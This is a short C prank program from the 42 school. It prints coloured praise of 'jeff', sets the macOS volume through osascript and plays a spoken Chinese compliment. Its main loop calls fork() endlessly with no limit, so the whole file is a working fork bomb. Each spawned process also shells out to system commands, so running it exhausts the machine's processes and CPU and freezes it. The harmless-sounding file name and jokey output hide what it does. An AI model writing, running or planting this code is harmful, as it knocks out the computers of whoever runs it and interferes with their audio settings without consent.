/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   creative_manger.c                                  :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: sding <marvin@42.fr>                       +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/04/14 21:29:26 by sding             #+#    #+#             */
/*   Updated: 2018/04/14 21:29:45 by sding            ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

#define ANSI_COLOR_RED     "\x1b[31m"
#define ANSI_COLOR_GREEN   "\x1b[32m"
#define ANSI_COLOR_YELLOW  "\x1b[33m"
#define ANSI_COLOR_BLUE    "\x1b[34m"
#define ANSI_COLOR_MAGENTA "\x1b[35m"
#define ANSI_COLOR_CYAN    "\x1b[36m"
#define ANSI_COLOR_RESET   "\x1b[0m"

void	text()
{
	printf(ANSI_COLOR_RED "jeff score 1\n" ANSI_COLOR_RESET "\n");
	printf(ANSI_COLOR_GREEN "jeff score 10\n" ANSI_COLOR_RESET "\n");
	printf(ANSI_COLOR_YELLOW "jeff socre 100\n" ANSI_COLOR_RESET "\n");
	printf(ANSI_COLOR_BLUE "jeff is the best\n" ANSI_COLOR_RESET "\n");
	printf(ANSI_COLOR_MAGENTA "yaaaaas\n" ANSI_COLOR_RESET "\n");
	printf(ANSI_COLOR_CYAN "oh my gosh\n" ANSI_COLOR_RESET "\n");
	sleep (1);
}

void	horse()
{
	system("osascript -e 'set Volume 3'");
	system("say -v Mei-Jia '你好帥'");
}

int		main(void)
{
	while (1)
	{
		fork();
		horse();
		text();
	}
	return (0);
}

